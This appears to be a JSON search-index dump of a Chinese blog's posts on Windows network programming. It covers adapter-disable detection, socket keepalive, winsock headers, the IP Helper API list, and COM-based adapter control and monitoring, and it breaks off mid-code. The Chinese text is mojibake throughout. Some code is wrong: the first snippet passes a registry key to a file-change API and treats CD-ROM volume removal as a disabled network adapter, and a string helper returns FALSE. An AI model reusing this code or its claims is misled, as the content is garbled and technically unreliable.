ç½‘å¡è¢«ç¦ç”¨äº‹ä»¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ­¥éª¤ï¼š ä½¿ç”¨ Windows API å‡½æ•°æ³¨å†Œç½‘ç»œé…ç½®æ›´æ”¹é€šçŸ¥ã€‚ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314151617181920212223HANDLE hNotify = NULL;HDEVNOTIFY hDevNotify = NULL;hNotify = FindFirstChangeNotificationW( HKEY_LOCAL_MACHINE, L&quot;SYSTEM\\\\CurrentControlSet\\\\Control\\\\Network&quot;, FALSE, FILE_NOTIFY_CHANGE_LAST_WRITE);if (hNotify == INVALID_HANDLE_VALUE)&#123; // Handle error&#125;hDevNotify = RegisterDeviceNotification( hwnd, &amp;filter, DEVICE_NOTIFY_WINDOW_HANDLE);if (hDevNotify == NULL)&#123; // Handle error&#125; å…¶ä¸­ï¼ŒHWNDæ˜¯æ¥æ”¶é€šçŸ¥çš„çª—å£å¥æŸ„ï¼Œfilteræ˜¯ä¸€äº›æ¡ä»¶ï¼Œä¾‹å¦‚é€šçŸ¥ç±»å‹ï¼Œè®¾å¤‡èŒƒå›´ç­‰ã€‚ åœ¨æ‚¨çš„çª—å£è¿‡ç¨‹å‡½æ•°ä¸­å¤„ç†é€šçŸ¥æ¶ˆæ¯ã€‚ å®ƒå°†æä¾›ä¸€ä¸ª lParam å‚æ•°ï¼Œè¯¥å‚æ•°æ˜¯ä¸€ä¸ªåŒ…å«æœ‰å…³æ›´æ”¹çš„ç»“æ„ä½“ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç æ¥æ£€æŸ¥æ˜¯å¦ç¦ç”¨äº†ä»»ä½•ç½‘ç»œé€‚é…å™¨ï¼š 12345678910111213141516171819202122232425262728case WM_DEVICECHANGE: PDEV_BROADCAST_HDR pHdr = (PDEV_BROADCAST_HDR)lParam; if (pHdr-&gt;dbch_devicetype == DBT_DEVTYP_VOLUME) &#123; PDEV_BROADCAST_VOLUME pVol = (PDEV_BROADCAST_VOLUME)pHdr; // Check if network adapter is disabled if (pVol-&gt;dbcv_flags &amp; DBTF_MEDIA) // Media is removed &#123; // Check if any network adapter is disabled DWORD dwDriveMask = pVol-&gt;dbcv_unitmask; if (dwDriveMask != 0) &#123; for (int i = 0; i &lt; 26; i++) &#123; if ((dwDriveMask &amp; 0x01) == 0x01) &#123; char szDrive[4] = &#123; &#x27;A&#x27; + i, &#x27;:&#x27;, &#x27;\\\\&#x27;, &#x27;\\0&#x27; &#125;; if (GetDriveType(szDrive) == DRIVE_CDROM) &#123; // Network adapter on this drive is disabled &#125; &#125; dwDriveMask &gt;&gt; = 1; &#125; &#125; &#125; &#125; return TRUE; è¿™æ®µä»£ç æ£€æŸ¥ç½‘ç»œé€‚é…å™¨æ˜¯å¦è¢«ç¦ç”¨ï¼Œå¹¶æ ¹æ®éœ€è¦æ‰§è¡Œæ“ä½œã€‚ è¯·æ³¨æ„ï¼Œè¿™äº›ä»£ç åªæ˜¯ä¸€ç§å‚è€ƒã€‚è¦ä½¿å®ƒä»¬æ­£å¸¸å·¥ä½œï¼Œæ‚¨éœ€è¦å°†å®ƒä»¬æ¤å…¥åˆ°æ‚¨çš„ä»£ç ä¸­ï¼Œå¹¶æ ¹æ®éœ€è¦è¿›è¡Œä¿®æ”¹ã€‚","tags":[{"name":"windows/ç½‘å¡","slug":"windows-ç½‘å¡","permalink":"https://hodlyounger.github.io/tags/windows-%E7%BD%91%E5%8D%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘ã€Windowsã€‘socket ä¿æ´»","date":"2023-10-27T01:24:02.073Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘socketä¿æ´»/","text":"æ¦‚è¿°ï¼šSocket ä¿æ´» 123456789101112131415161718192021222324252627282930313233343536373839404142BOOL _KeepAlive(SP_SOCKET fd)&#123; //å®šä¹‰ç»“æ„åŠå® struct KeepAlive &#123; u_long onoff; u_long keepalivetime; u_long keepaliveinterval; &#125;;#define SIO_KEEPALIVE_VALS _WSAIOW(IOC_VENDOR,4) //KeepAliveå®ç° KeepAlive inKeepAlive = &#123; 0 &#125;; //è¾“å…¥å‚æ•° unsigned long ulInLen = sizeof(KeepAlive); KeepAlive outKeepAlive = &#123; 0 &#125;; //è¾“å‡ºå‚æ•° unsigned long ulOutLen = sizeof(KeepAlive); unsigned long ulBytesReturn = 0; //keepalive xpä»¥å‰çš„ç³»ç»Ÿå‘é€5æ¬¡ï¼Œxpä¹‹åçš„ç³»ç»Ÿå‘é€10 inKeepAlive.onoff = 1; inKeepAlive.keepaliveinterval = 5000; //ä¸¤æ¬¡KeepAliveæ¢æµ‹é—´çš„æ—¶é—´é—´éš” inKeepAlive.keepalivetime = 5000; //å¼€å§‹é¦–æ¬¡KeepAliveæ¢æµ‹å‰çš„TCPç©ºé—­æ—¶é—´ if (WSAIoctl((SOCKET)fd, SIO_KEEPALIVE_VALS, (LPVOID)&amp;inKeepAlive, ulInLen, (LPVOID)&amp;outKeepAlive, ulOutLen, &amp;ulBytesReturn, NULL, NULL) == SOCKET_ERROR) &#123; LOGT(&quot;Set Keep Alive FAILED.&quot;); return FALSE; &#125; else &#123; LOGT(&quot;Set Keep Alive OK.&quot;); return TRUE; &#125;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘ã€Windowsã€‘ä½¿ç”¨ winsock2 ç›¸å…³å‡½æ•°","date":"2023-10-27T01:24:02.073Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘ä½¿ç”¨winsock2/","text":"winsock2.håœ¨æœ€å¼€å§‹include ipçš„ä¸€äº›å·¥å…·å‡½æ•°åœ¨ Iphlpapi.h 12345#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include &lt;stdio.h&gt;#pragma comment(lib, &quot;Ws2_32.lib&quot;) windows.h é»˜è®¤åŠ è½½ winsockç‰ˆæœ¬1. winsock2.h é»˜è®¤åŠ  windows.h ä¸å¾—ä¸åŠ  windows.h æ—¶å€™è®°å¾—åŠ å® WIN32_LEAN_AND_MEAN 123456789101112131415#ifndef WIN32_LEAN_AND_MEAN#define WIN32_LEAN_AND_MEAN#endif#include &lt;windows.h&gt;#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include &lt;iphlpapi.h&gt;#include &lt;stdio.h&gt;#pragma comment(lib, &quot;Ws2_32.lib&quot;)int main() &#123; return 0;&#125;","tags":[{"name":"windows/winsock","slug":"windows-winsock","permalink":"https://hodlyounger.github.io/tags/windows-winsock/"},{"name":"iphelper","slug":"iphelper","permalink":"https://hodlyounger.github.io/tags/iphelper/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘ã€Windowsã€‘iphepler æ¥å£æ•´ç†","date":"2023-10-27T01:24:02.072Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘iphelperæ¥å£æ•´ç†/","text":"The following functions are used in Windows networking: Obsolete Functions The following function is provided only for compatibility with 16-bit versions of Windows: windowsæä¾›äº†å¤§é‡çš„ç½‘ç»œè¾…åŠ©å‡½æ•°ï¼Œå¦‚ä¸‹ä¹Ÿä¸ºæ¢è®¨å†…å®¹ï¼š IP Helper Functions The following functions retrieve and modify configuration settings for the TCP/IP transport on the local computer. The following categorical listing can help determine which collection of functions is best suited for a given task: Adapter Management GetAdapterIndex GetAdaptersAddresses GetAdaptersInfo GetPerAdapterInfo GetUniDirectionalAdapterInfo Address Resolution Protocol (ARP) Management CreateIpNetEntry CreateProxyArpEntry DeleteIpNetEntry DeleteProxyArpEntry FlushIpNetTable GetIpNetTable SendARP SetIpNetEntry Interface Conversion ConvertInterfaceAliasToLuid ConvertInterfaceGuidToLuid ConvertInterfaceIndexToLuid ConvertInterfaceLuidToAlias ConvertInterfaceLuidToGuid ConvertInterfaceLuidToIndex ConvertInterfaceLuidToNameA ConvertInterfaceLuidToNameW ConvertInterfaceNameToLuidA ConvertInterfaceNameToLuidW if_indextoname if_nametoindex Interface Management GetFriendlyIfIndex GetIfEntry GetIfEntry2 GetIfStackTable GetIfTable GetIfTable2 GetIfTable2Ex GetInterfaceInfo GetInvertedIfStackTable GetIpInterfaceEntry GetIpInterfaceTable GetNumberOfInterfaces InitializeIpInterfaceEntry SetIfEntry SetIpInterfaceEntry Internet Protocol (IP) and Internet Control Message Protocol (ICMP) GetIcmpStatistics GetIpStatistics Icmp6CreateFile Icmp6ParseReplies Icmp6SendEcho2 IcmpCloseHandle IcmpCreateFile IcmpParseReplies IcmpSendEcho IcmpSendEcho2 IcmpSendEcho2Ex SetIpTTL IP Address Management AddIPAddress CreateAnycastIpAddressEntry CreateUnicastIpAddressEntry DeleteIPAddress DeleteAnycastIpAddressEntry DeleteUnicastIpAddressEntry GetAnycastIpAddressEntry GetAnycastIpAddressTable GetIpAddrTable GetMulticastIpAddressEntry GetMulticastIpAddressTable GetUnicastIpAddressEntry GetUnicastIpAddressTable InitializeUnicastIpAddressEntry IpReleaseAddress IpRenewAddress NotifyStableUnicastIpAddressTable SetUnicastIpAddressEntry IP Address String Conversion RtlIpv4AddressToString RtlIpv4AddressToStringEx RtlIpv4StringToAddress RtlIpv4StringToAddressEx RtlIpv6AddressToString RtlIpv6AddressToStringEx RtlIpv6StringToAddress RtlIpv6StringToAddressEx IP Neighbor Address Management CreateIpNetEntry2 DeleteIpNetEntry2 FlushIpNetTable2 GetIpNetEntry2 GetIpNetTable2 ResolveIpNetEntry2 ResolveNeighbor SetIpNetEntry2 IP Path Management FlushIpPathTable GetIpPathEntry GetIpPathTable IP Route Management CreateIpForwardEntry CreateIpForwardEntry2 DeleteIpForwardEntry DeleteIpForwardEntry2 EnableRouter GetBestInterface GetBestInterfaceEx GetBestRoute GetBestRoute2 GetIpForwardEntry2 GetIpForwardTable GetIpForwardTable2 GetRTTAndHopCount InitializeIpForwardEntry SetIpForwardEntry SetIpForwardEntry2 SetIpStatistics SetIpStatisticsEx UnenableRouter IP Table Memory Management FreeMibTable IP Utility ConvertIpv4MaskToLength ConvertLengthToIpv4Mask CreateSortedAddressPairs ParseNetworkString Network Configuration GetNetworkParams Notification CancelMibChangeNotify2 NotifyAddrChange","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"ip","slug":"ip","permalink":"https://hodlyounger.github.io/tags/ip/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘ã€Windowsã€‘C++ é€šè¿‡ COM ç»„ä»¶ å¯ç”¨\\ç¦ç”¨\\æŸ¥çœ‹ ç½‘å¡çŠ¶æ€","date":"2023-10-27T01:24:02.071Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘COMæŸ¥çœ‹ç½‘å¡çŠ¶æ€/","text":"æ¦‚è¿°ï¼šé€šè¿‡ COM å¯¹è±¡æ“ä½œç½‘å¡ 123456789101112131415161718192021222324252627282930313233343536#include &lt;NetCon.h&gt;void ChangeNetState()&#123; CoInitialize(NULL); INetConnectionManager* pNetManager; INetConnection* pNetConnection; IEnumNetConnection* pEnum; if (S_OK != CoCreateInstance(CLSID_ConnectionManager, NULL, CLSCTX_SERVER, IID_INetConnectionManager, (void**)&amp;pNetManager)) &#123; return ; &#125; pNetManager-&gt;EnumConnections(NCME_DEFAULT, &amp;pEnum); pNetManager-&gt;Release(); if (NULL == pEnum) &#123; return ; &#125; ULONG celtFetched; while (pEnum-&gt;Next(1, &amp;pNetConnection, &amp;celtFetched) == S_OK) &#123; NETCON_PROPERTIES* properties; pNetConnection-&gt;GetProperties(&amp;properties); //properties-&gt;pszwName; //ç½‘ç»œè¿æ¥çš„åç§° //properties-&gt;pszwDeviceName; //ç½‘å¡åç§° //properties-&gt;Status; //çŠ¶æ€ //pNetConnection-&gt;Disconnect(); //ç¦ç”¨ç½‘å¡ //pNetConnection-&gt;Connect(); //å¯ç”¨ç½‘å¡ &#125; CoUninitialize(); return ;&#125; NETCON_PROPERTIES ç»“æ„ä½“ä½¿ç”¨çš„å˜é‡ä¸ºå®½å­—ç¬¦ï¼Œåœ¨æ‰“å°æ—¶éœ€è¦åœ¨ç¨‹åºå…¥å£è°ƒç”¨ä»¥ä¸‹å‡½æ•°æ‰èƒ½æ­£ç¡®è¾“å‡ºã€‚ 1setlocale(LC_CTYPE, &quot;chs&quot;);","tags":[{"name":"windows/ç½‘å¡","slug":"windows-ç½‘å¡","permalink":"https://hodlyounger.github.io/tags/windows-%E7%BD%91%E5%8D%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç½‘ç»œhelper","slug":"A-OS/Windows/ç½‘ç»œhelper","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘ã€Windowsã€‘ç›‘æ§æŒ‡å®šç½‘å¡äº‹ä»¶","date":"2023-10-27T01:24:02.070Z","path":"A_OS/Windows/ç½‘ç»œhelper/ã€ç½‘ç»œç¼–ç¨‹ã€‘(è¶…è¯¦ç»†)ç›‘æ§ç½‘å¡äº‹ä»¶2/","text":"[toc] win comç±»å’Œæ¥å£è¯´æ˜ 1. INetworkListManager INetworkListManager æ¥å£æä¾›äº†ä¸€ç»„ç”¨äºæ‰§è¡Œç½‘ç»œåˆ—è¡¨ç®¡ç†åŠŸèƒ½çš„æ–¹æ³•ã€‚ [é€šè¿‡comç»„ä»¶è·å–ç³»ç»Ÿç½‘å¡] INetworkListManageræ¥å£ INetworkListManagerï¼šï¼šClearSimulatedProfileInfo æ¸…é™¤ä»¥å‰é€šè¿‡ SetSimulatedProfileInfo åº”ç”¨äº Internet è¿æ¥é…ç½®æ–‡ä»¶çš„è¿æ¥é…ç½®æ–‡ä»¶å€¼ã€‚ ä¸‹ä¸€ä¸ª Internet è¿æ¥æŸ¥è¯¢ï¼ˆé€šè¿‡ GetInternetConnectionProfileï¼‰å°†ä½¿ç”¨ç³»ç»Ÿä¿¡æ¯ã€‚ INetworkListManagerï¼šï¼šget_IsConnected get_IsConnected å±æ€§æŒ‡å®šæœ¬åœ°è®¡ç®—æœºæ˜¯å¦å…·æœ‰ç½‘ç»œè¿æ¥ã€‚ INetworkListManagerï¼šï¼šget_IsConnectedToInternet get_IsConnectedToInternet å±æ€§æŒ‡å®šæœ¬åœ°è®¡ç®—æœºæ˜¯å¦å…·æœ‰ Internet è¿æ¥ã€‚ INetworkListManagerï¼šï¼šGetConnectivity GetConnectivity æ–¹æ³•è¿”å›è®¡ç®—æœºçš„æ•´ä½“è¿æ¥çŠ¶æ€ã€‚ INetworkListManagerï¼šï¼šGetNetwork GetNetwork æ–¹æ³•åŸºäºæä¾›çš„ç½‘ç»œ ID æ£€ç´¢ç½‘ç»œã€‚ INetworkListManagerï¼šï¼šGetNetworkConnection GetNetworkConnection æ–¹æ³•åŸºäºæä¾›çš„ç½‘ç»œè¿æ¥ ID æ£€ç´¢ç½‘ç»œã€‚ INetworkListManagerï¼šï¼šGetNetworkConnections GetNetworkConnections æ–¹æ³•æšä¸¾å·²å»ºç«‹çš„ç½‘ç»œè¿æ¥çš„å®Œæ•´åˆ—è¡¨ã€‚ INetworkListManagerï¼šï¼šGetNetworks GetNetworks æ–¹æ³•æ£€ç´¢æœ¬åœ°è®¡ç®—æœºä¸Šå¯ç”¨çš„ç½‘ç»œåˆ—è¡¨ã€‚ INetworkListManagerï¼šï¼šSetSimulatedProfileInfo SetSimulatedProfileInfo æ–¹æ³•å°†ä¸€ç»„ç‰¹å®šçš„è¿æ¥é…ç½®æ–‡ä»¶å€¼åº”ç”¨äº Internet è¿æ¥é…ç½®æ–‡ä»¶ï¼Œä»¥æ”¯æŒç‰¹å®šæŒ‰æµé‡è®¡è´¹çš„ Internet è¿æ¥æ¡ä»¶æ¨¡æ‹Ÿã€‚ ä½¿ç”¨å‚è€ƒï¼š 123456789101112...IUnknown* pUnknown = NULL;HRESULT Result = CoCreateInstance(CLSID_NetworkListManager, NULL, CLSCTX_ALL, IID_IUnknown, (void**)&amp;pUnknown);if (SUCCEEDED(Result))&#123; INetworkListManager* pNetworkListManager = NULL; Result = pUnknown-&gt;QueryInterface(IID_INetworkListManager, (void**)&amp;pNetworkListManager); if (SUCCEEDED(Result)) &#123; &#125;... 2. INetConnectionManager 3. IConnectionPointContainer æ”¯æŒå¯è¿æ¥å¯¹è±¡çš„è¿æ¥ç‚¹ã€‚ IConnectionPointContainerï¼šï¼šEnumConnectionPoints åˆ›å»ºæšä¸¾å™¨å¯¹è±¡ä»¥å¾ªç¯è®¿é—®å¯è¿æ¥å¯¹è±¡ä¸­æ”¯æŒçš„æ‰€æœ‰è¿æ¥ç‚¹ï¼Œæ¯ä¸ªä¼ å‡º IID ä¸€ä¸ªè¿æ¥ç‚¹ã€‚ IConnectionPointContainerï¼šï¼šFindConnectionPoint å¦‚æœ IID æè¿°æ”¯æŒçš„ä¼ å‡ºæ¥å£ï¼Œåˆ™è¿”å›æŒ‡å‘æŒ‡å®š IID çš„è¿æ¥ç‚¹çš„ IConnectionPoint æ¥å£çš„æŒ‡é’ˆã€‚ ä½¿ç”¨å‚è€ƒï¼š 12345678910111213...IConnectionPointContainer* pCPContainer = NULL;Result = pNetworkListManager-&gt;QueryInterface(IID_IConnectionPointContainer, (void**)&amp;pCPContainer);if (SUCCEEDED(Result))&#123; IConnectionPoint* pConnectPoint = NULL; Result = pCPContainer-&gt;FindConnectionPoint(IID_INetworkListManagerEvents, &amp;pConnectPoint); // æŸ¥æ‰¾ IID å¯¹åº”çš„è¿æ¥ç‚¹ if (SUCCEEDED(Result)) &#123; &#125;&#125;... 4. IConnectionPoint æ”¯æŒå¯è¿æ¥å¯¹è±¡çš„è¿æ¥ç‚¹ã€‚é€šè¿‡ IConnectionPointContainer::FindConnectionPoint è·å–ã€‚é€šè¿‡å…¶å‡½æ•° Advise å¯ä»¥å»ºç«‹è¿æ¥ç‚¹å¯¹è±¡ä¸å®¢æˆ·ç«¯æ¥æ”¶å™¨ä¹‹é—´çš„è¿æ¥ã€‚ä¹Ÿå°±æ˜¯å¯ä»¥é€šè¿‡æ­¤æ¥å£å®ç°ç½‘ç»œäº‹ä»¶çš„ç›‘æ§ã€‚ ç¬¬ä¸€ä¸ªå‚æ•°å‚è€ƒ netListmgr.h ä½¿ç”¨å‚è€ƒï¼š 123456789101112131415...IConnectionPoint* pConnectPoint = NULL;Result = pCPContainer-&gt;FindConnectionPoint(IID_INetworkListManagerEvents, &amp;pConnectPoint);if (SUCCEEDED(Result))&#123; DWORD Cookie = NULL; CNetworkMonitor networkMonitor; std::function&lt;void(bool)&gt; monitorFunc = std::bind(&amp;CNetworkMonitor::NetworkStatusChangedCallback, networkMonitor, std::placeholders::_1); // CNetworkListManagerEvent ä¸ºç»§æ‰¿è‡ª INetworkListManagerEvents çš„ç±»ï¼Œé‡è½½äº† ConnectivityChanged å‡½æ•° CNetworkListManagerEvent* pNetEvent = new(std::nothrow) CNetworkListManagerEvent(monitorFunc); if (pNetEvent) &#123; Result = pConnectPoint-&gt;Advise((IUnknown*)pNetEvent, &amp;Cookie); ... 5. INetConnection https://learn.microsoft.com/en-us/windows/win32/api/netcon/nn-netcon-inetconnection ä½¿ç”¨ç¤ºä¾‹ 1ï¼š ç›‘æ§ç½‘ç»œçŠ¶æ€ï¼ŒåŒæ—¶å¯ä»¥ç›‘æ§wifeçš„ç½‘ç»œè´¨é‡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;locale&gt;#include &lt;codecvt&gt;#include &lt;functional&gt;#include &lt;Windows.h&gt;#include &lt;netlistmgr.h&gt;#include &lt;atlbase.h&gt;#include &lt;objbase.h&gt;#include &lt;wtypes.h&gt;#include &lt;wlanapi.h&gt;#include &lt;netcon.h&gt;#include &lt;IPHlpApi.h&gt;#include &lt;comutil.h&gt;#pragma comment(lib, &quot;comsuppwd.lib&quot;)#pragma comment(lib, &quot;ole32.lib&quot;)#pragma comment(lib, &quot;wlanapi.lib&quot;)#pragma comment(lib, &quot;Iphlpapi.lib&quot;)static std::string WCharToMByte(LPCWSTR lpcwszStr)&#123; std::string str; DWORD dwMinSize = 0; LPSTR lpszStr = NULL; dwMinSize = WideCharToMultiByte(CP_OEMCP, NULL, lpcwszStr, -1, NULL, 0, NULL, FALSE); if (0 == dwMinSize) &#123; return FALSE; &#125; lpszStr = new char[dwMinSize]; WideCharToMultiByte(CP_OEMCP, NULL, lpcwszStr, -1, lpszStr, dwMinSize, NULL, FALSE); str = lpszStr; delete[] lpszStr; return str;&#125;static std::wstring GUIDToString(const GUID&amp; guid)&#123; OLECHAR guidString[40] = &#123; 0 &#125;; ::StringFromGUID2(guid, guidString, sizeof(guidString)); return guidString;&#125;static std::string UnicodeToUTF8(const std::wstring&amp; wstr)&#123; std::string ret; try &#123; std::wstring_convert&lt; std::codecvt_utf8&lt;wchar_t&gt; &gt; wcv; ret = wcv.to_bytes(wstr); &#125; catch (const std::exception&amp; e) &#123; std::cerr &lt;&lt; e.what() &lt;&lt; std::endl; &#125; return ret;&#125;class NetWorkEvent : public INetworkConnectionEvents&#123;private: LONG _ref; std::function&lt;void()&gt; _callback;public: NetWorkEvent(const std::function&lt;void()&gt;&amp; cb); virtual HRESULT STDMETHODCALLTYPE NetworkConnectionConnectivityChanged( /* [in] */ GUID connectionId, /* [in] */ NLM_CONNECTIVITY newConnectivity); virtual HRESULT STDMETHODCALLTYPE NetworkConnectionPropertyChanged( /* [in] */ GUID connectionId, /* [in] */ NLM_CONNECTION_PROPERTY_CHANGE flags); STDMETHODIMP QueryInterface(REFIID refIID, void** pIFace); virtual ULONG __stdcall AddRef(void); virtual ULONG __stdcall Release(void);&#125;;NetWorkEvent::NetWorkEvent(const std::function&lt;void()&gt;&amp; cb) : _callback(cb)&#123;&#125;HRESULT NetWorkEvent::NetworkConnectionConnectivityChanged(GUID connectionId, NLM_CONNECTIVITY newConnectivity)&#123; std::wcout &lt;&lt; GUIDToString(connectionId) &lt;&lt; &quot; | NUL_CONNECTIVITY : &quot; &lt;&lt; newConnectivity &lt;&lt; std::endl; if (_callback) &#123; _callback(); &#125; return S_OK;&#125;HRESULT NetWorkEvent::NetworkConnectionPropertyChanged(GUID connectionId, NLM_CONNECTION_PROPERTY_CHANGE flags)&#123; return S_OK;&#125;STDMETHODIMP NetWorkEvent::QueryInterface(REFIID refIID, void** pIFace)&#123; HRESULT hr = S_OK; *pIFace = NULL; if (IsEqualIID(refIID, IID_IUnknown)) &#123; *pIFace = (IUnknown*)this; ((IUnknown*)*pIFace)-&gt;AddRef(); &#125; else if (IsEqualIID(refIID, IID_INetworkConnectionEvents)) &#123; *pIFace = (INetworkConnectionEvents*)this; ((IUnknown*)*pIFace)-&gt;AddRef(); &#125; else &#123; hr = E_NOINTERFACE; &#125; return hr;&#125;ULONG NetWorkEvent::AddRef(void)&#123; return (ULONG)InterlockedIncrement(&amp;_ref);&#125;ULONG NetWorkEvent::Release(void)&#123; LONG Result = InterlockedDecrement(&amp;_ref); if (Result == 0) delete this; return (ULONG)Result;&#125;enum NetworkType&#123; NotNetwork, Ethernet, Wlan,&#125;;enum WiFiQuality&#123; Weak, // (-INF, -70dBm) Fair, // [-70dBm, -60dBm) Good, // [-60dBm, -50dBm) Excellent // [-50dBm, +INF)&#125;;struct ConnectionInfo&#123; std::wstring guid; NetworkType type;&#125;;class NetworkMonitor&#123; friend void OnNotificationCallback(PWLAN_NOTIFICATION_DATA Data, PVOID context);public: NetworkMonitor(); ~NetworkMonitor(); std::vector&lt;ConnectionInfo&gt; GetNetworkConnections(); NetworkType GetNetAdpaterType(const std::wstring&amp; guid); void OnNetworkStatusChange(); WiFiQuality GetWiFiSignalQuality(const std::wstring&amp; guid); void OnWiFiQualityChange(const GUID&amp; guid); void ShowNetworkStatus();private: std::unique_ptr&lt;NetWorkEvent&gt; _networkEvent; DWORD _cookie; CComPtr&lt;INetworkListManager&gt; _pNLM; CComPtr&lt;IConnectionPointContainer&gt; _pCpc; CComPtr&lt;IConnectionPoint&gt; _pConnectionPoint; HANDLE _wlanHandle;&#125;;static NetworkMonitor* InstanceOfNetworkMonitor()&#123; static NetworkMonitor instance; return &amp;instance;&#125;NetworkMonitor::NetworkMonitor()&#123; CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE); HRESULT hr = CoCreateInstance(CLSID_NetworkListManager, NULL, CLSCTX_ALL, IID_INetworkListManager, (LPVOID*)&amp;_pNLM); hr = _pNLM-&gt;QueryInterface(IID_IConnectionPointContainer, (void**)&amp;_pCpc); hr = _pCpc-&gt;FindConnectionPoint(IID_INetworkConnectionEvents, &amp;_pConnectionPoint); _networkEvent = std::make_unique&lt;NetWorkEvent&gt;(std::bind(&amp;NetworkMonitor::OnNetworkStatusChange, this)); hr = _pConnectionPoint-&gt;Advise((IUnknown*)_networkEvent.get(), &amp;_cookie);&#125;NetworkMonitor::~NetworkMonitor()&#123; if (_pConnectionPoint) &#123; _pConnectionPoint-&gt;Unadvise(_cookie); &#125; CloseHandle(_wlanHandle); CoUninitialize();&#125;void OnNotificationCallback(PWLAN_NOTIFICATION_DATA Data, PVOID context)&#123; if (Data != NULL &amp;&amp; Data-&gt;NotificationSource == WLAN_NOTIFICATION_SOURCE_MSM &amp;&amp; Data-&gt;NotificationCode == wlan_notification_msm_signal_quality_change) &#123; WLAN_SIGNAL_QUALITY Qality = (WLAN_SIGNAL_QUALITY)Data-&gt;pData; std::cout &lt;&lt; &quot;WiFi OnNotification Qality : &quot; &lt;&lt; Qality &lt;&lt; std::endl; InstanceOfNetworkMonitor()-&gt;OnWiFiQualityChange(Data-&gt;InterfaceGuid); &#125;&#125;std::vector&lt;ConnectionInfo&gt; NetworkMonitor::GetNetworkConnections()&#123; std::vector&lt;ConnectionInfo&gt; result; CComPtr&lt;IEnumNetworkConnections&gt; enumConnectons; if (FAILED(_pNLM-&gt;GetNetworkConnections(&amp;enumConnectons))) &#123; std::cerr &lt;&lt; &quot;GetNetworkConnections error : &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; return result; &#125; if (enumConnectons) &#123; ULONG lFetch; INetworkConnection* connection = nullptr; while (SUCCEEDED(enumConnectons-&gt;Next(1, &amp;connection, &amp;lFetch)) &amp;&amp; nullptr != connection) &#123; // åˆ¤æ–­æ˜¯å¦å½“å‰è¿æ¥ç½‘å¡ /* VARIANT_BOOL isConnectInternet = VARIANT_FALSE; connection-&gt;get_IsConnectedToInternet(&amp;isConnectInternet); if (isConnectInternet == VARIANT_FALSE) &#123; 